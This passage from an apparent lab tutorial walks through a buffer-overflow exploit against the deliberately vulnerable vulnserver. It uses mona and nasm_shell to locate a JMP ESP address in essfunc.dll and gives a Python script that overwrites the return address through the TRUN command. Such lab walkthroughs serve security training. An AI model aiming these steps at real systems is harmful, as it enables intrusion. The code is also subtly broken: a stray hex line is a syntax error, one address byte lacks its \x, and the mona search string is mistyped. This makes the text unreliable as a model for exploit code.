What we are saying in finding the right module is that we are looking for a DLL or something similar inside of a program that has no memory protection.

### Practicals

- On your windows machine go to your browser and download this [file](https://github.com/corelan/mona/blob/master/mona.py)
- Copy the file to this location `C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands` and save it
- Now open immunity debugger and attach vulnserver
- On the little command bar down immunity debugger type in `!mona modules` and you should a pop-up with green text over dark screen

![](https://i.imgur.com/9Iohr5p.png)

![](https://i.imgur.com/19zh7e6.png)

- What we are looking for are rows with the `False` statement all through and `.dll` (keep this information for now)

![](https://i.imgur.com/QR7wUnD.png)

- The next thing to do is to find the **hex code equivalent of a jump** , to do this:
	- Goto your kali terminal and locate `nasm_shell.rb`
	- Copy the output and paste on your terminal, then click enter

![](https://i.imgur.com/pzDMUSn.png)

- What we are trying to do is convert assembly language into hex code, type in `JMP ESP` on your terminal which is a jump command

![](https://i.imgur.com/gatZgbH.png)

So the hex code equivalent of `JMP ESP` is `FFE4` 

- We will go back to our immunity debugger and type in this command `!mona find -s "x\ff\e4" -m essfunc.dll` , make sure there is a "\x" followed by two pairs of hex in other to separate the hex in `"\xff\xe4"` and also the major reason why we are using **essfunc.dll** is because that is the program that has the False statement all through in a row , Now click enter

![](https://i.imgur.com/2iJD21A.png)

The highlighted box result is what we are more interested in, so go back to your terminal and exit the nasm_shell.rb  , Now copy this python code and save it

```python
#!/usr/bin/python
 
import sys, socket

625011af

# replace 2003 with the offset you got 
shellcode = "A" * 2003 + "\xaf\x11\x50\62"

try: 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.0.106',9999))
        s.send(('TRUN /.:/' + shellcode))
        s.close()

except:
        print ("Error Connecting to the server")
        sys.exit()
```

- First of all if you notice in this script we have a standalone hex which is `625011af` gotten from the first result in the highlighted box we mentioned earlier and as you can se down the image below `0x` was stripped off
![](https://i.imgur.com/KvpK6R7.png)

- then the line `shellcode = "A" * 2003 + "\xaf\x11\x50\62"` in which A is sent 2003 times with the TRUN command and the `"\xaf\x11\x50\62"` is still the number we had but starting from the back with \x (because of some x86 architecture) 

Now navigate back to immunity debugger and minimize the tab and maximize it back to clear the command output center

![](https://i.imgur.com/87DKyzx.png)


	Click on the blackish right arrow on the tools bar and you should see an enter expression tab, then enter our jump code which is 

![](https://i.imgur.com/lDMN3pM.png)




